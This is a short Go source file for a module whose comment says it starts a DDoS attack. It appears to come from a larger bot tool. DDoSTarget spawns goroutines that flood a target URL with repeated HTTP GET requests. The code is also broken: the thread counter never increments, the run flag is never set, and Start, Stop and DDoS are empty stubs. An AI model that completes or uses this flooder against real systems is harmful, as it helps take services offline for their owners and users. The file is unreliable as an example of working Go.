package modules

import "net/http"

/*
Will start a DDoS attack on the target
*/

var (
	state   bool
	threads int = 8
)

func DDoS() string {
	return ""
}

func DDoSTarget(target string) string {
	currentThread := 0
	for currentThread < threads {
		go flood(target)
	}
	return ""
}

func flood(target string) {
	for state {
		http.Get(target)
	}
}

func Stop() {

}

func Start() {

}
